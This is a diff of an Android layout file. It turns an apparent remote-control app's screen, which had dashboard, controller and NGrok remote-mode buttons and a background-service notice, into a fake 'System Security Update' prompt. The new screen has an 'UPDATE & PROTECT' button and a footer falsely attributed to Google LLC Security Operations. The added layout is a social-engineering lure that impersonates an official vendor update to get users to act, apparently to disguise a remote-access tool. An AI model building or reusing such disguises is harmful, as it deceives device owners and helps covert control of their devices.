@@ -1,80 +1,70 @@
 <?xml version="1.0" encoding="utf-8"?>
-<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
-    android:orientation="vertical"
-    android:padding="16dp"
-    android:gravity="center">
+    android:background="#FFFFFF"
+    android:padding="24dp">
 
-    <!-- Status Display -->
-    <TextView
-        android:id="@+id/statusView"
+    <LinearLayout
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
-        android:text="⚪ Checking..."
-        android:textSize="18sp"
-        android:textStyle="bold"
-        android:textColor="#2196F3"
-        android:gravity="center"
-        android:layout_marginBottom="30dp"
-        android:padding="16dp"
-        android:background="#E3F2FD"
-        android:layout_marginLeft="8dp"
-        android:layout_marginRight="8dp"/>
+        android:orientation="vertical"
+        android:layout_centerInParent="true"
+        android:gravity="center">
 
-    <!-- Main Dashboard Button - BIG -->
-    <Button
-        android:id="@+id/btnDashboard"
-        android:layout_width="match_parent"
-        android:layout_height="100dp"
-        android:text="📊\nOpen\nDashboard"
-        android:textSize="22sp"
-        android:textStyle="bold"
-        android:layout_marginBottom="16dp" />
+        <ImageView
+            android:layout_width="80dp"
+            android:layout_height="80dp"
+            android:src="@android:drawable/ic_dialog_info"
+            android:tint="#4CAF50"
+            android:layout_marginBottom="24dp" />
 
-    <!-- Controller Button (NEW) -->
-    <Button
-        android:id="@+id/btnController"
-        android:layout_width="match_parent"
-        android:layout_height="60dp"
-        android:text="🎮 Controller - Điều Khiển Từ ĐT"
-        android:textSize="14sp"
-        android:layout_marginBottom="12dp" />
+        <TextView
+            android:id="@+id/titleView"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="System Security Update"
+            android:textSize="22sp"
+            android:textStyle="bold"
+            android:textColor="#212121"
+            android:layout_marginBottom="8dp" />
 
-    <!-- Toggle Mode Button -->
-    <Button
-        android:id="@+id/btnToggleMode"
-        android:layout_width="match_parent"
-        android:layout_height="60dp"
-        android:text="Switch to Remote (NGrok)"
-        android:textSize="14sp"
-        android:layout_marginBottom="12dp" />
+        <TextView
+            android:id="@+id/statusView"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="A new security patch is available to protect your device from potential threats."
+            android:textSize="14sp"
+            android:textColor="#757575"
+            android:gravity="center"
+            android:layout_marginBottom="32dp" />
 
-    <!-- Settings Button -->
-    <Button
-        android:id="@+id/btnSettings"
-        android:layout_width="match_parent"
-        android:layout_height="50dp"
-        android:text="⚙️ Settings"
-        android:textSize="14sp"
-        android:layout_marginBottom="12dp"/>
+        <ProgressBar
+            android:id="@+id/progressBar"
+            style="?android:attr/progressBarStyleHorizontal"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:layout_marginBottom="32dp"
+            android:visibility="gone" />
 
-    <!-- Close Button -->
-    <Button
-        android:id="@+id/btnClose"
-        android:layout_width="match_parent"
-        android:layout_height="50dp"
-        android:text="✕ Close"
-        android:textSize="14sp"/>
+        <Button
+            android:id="@+id/btnUpdate"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="UPDATE &amp; PROTECT"
+            android:backgroundTint="#4CAF50"
+            android:textColor="#FFFFFF"
+            android:padding="12dp" />
+
+    </LinearLayout>
 
     <TextView
-        android:layout_width="match_parent"
+        android:layout_width="wrap_content"
         android:layout_height="wrap_content"
-        android:text="Service running in background\nAuto-detects LAN vs Remote mode"
-        android:layout_marginTop="30dp"
-        android:textSize="11sp"
-        android:textColor="#999999"
-        android:gravity="center"
-        android:lineSpacingExtra="4dp"/>
+        android:layout_alignParentBottom="true"
+        android:layout_centerHorizontal="true"
+        android:text="© Google LLC - Security Operations"
+        android:textSize="10sp"
+        android:textColor="#BDBDBD" />
 
-</LinearLayout>
+</RelativeLayout>
